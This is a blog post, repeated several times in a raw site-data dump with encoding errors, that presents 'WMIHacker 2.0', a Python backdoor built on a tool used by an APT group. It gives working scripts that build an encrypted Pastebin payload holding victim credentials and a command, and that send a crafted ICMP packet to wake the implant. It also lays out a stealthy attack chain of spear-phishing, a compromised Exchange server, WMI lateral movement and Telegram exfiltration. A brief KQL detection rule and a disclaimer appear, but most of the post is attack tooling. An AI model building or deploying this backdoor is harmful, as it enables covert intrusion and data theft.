focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--assymetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; AsyÑŒmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; AsyÑŒmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; AsyÑŒmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the specified command, and extracts a Telegram bot token used for exfiltration.\ndef xorshift_encrypt(data: bytes, key: int) -\u0026gt; bytes: result = bytearray() state = key \u0026amp; 0xFFFFFFFF for b in data: state ^= (state \u0026lt;\u0026lt; 13) \u0026amp; 0xFFFFFFFF state ^= (state \u0026gt;\u0026gt; 17) state ^= (state \u0026lt;\u0026lt; 5) \u0026amp; 0xFFFFFFFF prng_byte = (state \u0026amp; 0xFF) result.append(b ^ prng_byte) return bytes(result) # all these parameters are used in the payload, change for your needs KEY=0xDEADBEEF TOKEN = \u0026#34;BOT TOKEN\u0026#34; CHAT_ID = \u0026#34;CHAT ID\u0026#34; IP_ADDR = \u0026#34;VICTIM_IP\u0026#34; USER = \u0026#34;USERNAME\u0026#34; PASSWORD = \u0026#34;PASSWORD\u0026#34; COMMAND = \u0026#34;echo \u0026#39;YOU HAVE BEEN PWNED!\u0026#39; \u0026gt; C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the less artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previus section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nDetection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 â€“ Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe â€“ Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; â€“ Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 ðŸ‘¾"},{"content":" DISCLAIMER: This article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\nTable of Contents Introduction Earth Kurma Chain Symmetric \u0026amp; Asymmetric approach in C2 infra Symmetric C2 Asymmetric C2 WMIHacker 2.0 Detection \u0026amp; Response Conclusion Introduction In this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\nWeâ€™ll walk through a full attack chain using the new tool, exploring how it can be integrated into modern offensive operations. Finally, the article will cover methods for detecting such attacks and provide insights into improving defense mechanisms against them.\nTool Repo: https://github.com/s0ld13rr/WMIHACKER\nEarth Kurma Chain In Trend Microâ€™s analysis of the Earth Kurma APT campaign, attackers used WMIHACKER, an open-source post-exploitation tool designed to execute commands remotely over port 135 using WMI/DCOM â€” without relying on SMB or WinRM. Interestingly, the original script does not use Win32_Process directly for execution, which often causes compatibility issues.\nDuring my own experiments, I decided to refactor and change the concept of WMIHACKER to support stable Red Team operations inside real-world infrastructures, improving execution reliability, error handling, and output collection across segmented environments. By abusing native protocols and executing commands, it enables quiet lateral movement ideal for stealthy operations.\nSymmetric \u0026amp; Asymmetric approach in C2 infra But before we start observing wmihacker, I would like to explain the concept of symmetric and asymmetric C2 approaches. During the development of of this project and analysis of existing threat actor operations, I introduced and formalized two concepts that help classify C2 architectures more effectively: Symmetric C2 and Asymmetric C2.\nSymmetric C2 A Symmetric C2 approach is characterized by a direct and predictable interaction between the server (C2) and the agents (implants). Each agent directly communicates with a central C2 server, and the flow of command and data is relatively flat and transparent.\nKey Characteristics:\nOne-to-one or one-to-many agent-to-C2 relationship.\nThe C2 server maintains state and task queues for each agent.\nCommunication is typically periodic (beaconing, polling) or session-based (reverse shell, socks).\nEasier to map and detect from a defensive standpoint.\nUse Cases:\nPost-exploitation in isolated networks.\nCampaigns with short dwell time.\nControlled Red Team engagements.\nAsymmetric C2 An Asymmetric C2 approach involves a multi-layered, often indirect communication chain. Agents may not talk to the main C2 server directly; instead, they may receive commands or exfiltrate data via intermediate nodesâ€”other compromised machines or pivoting points.\nKey Characteristics:\nMulti-hop architecture, often involving lateral movement.\nCommands can be relayed through another compromised host (e.g., infected Exchange server with WMI agent).\nResults may be forwarded to another C2 server entirely.\nHarder to correlate agent actions to a single C2 node.\nResilient to takedown and more stealthy.\nUse Cases:\nAPT-level operations.\nRed Team simulations that mimic real-world actor TTPs.\nScenarios involving air-gapped or heavily segmented environments.\nWMIHacker 2.0 I decided to redesign the original VBS script and implement a backdoor in Python that installs itself as a service on the host system. This backdoor operates asymmetrically and is triggered when a specially crafted ICMP ECHO request is received. Once activated, it retrieves the payload and related instructions from Pastebin, executes the 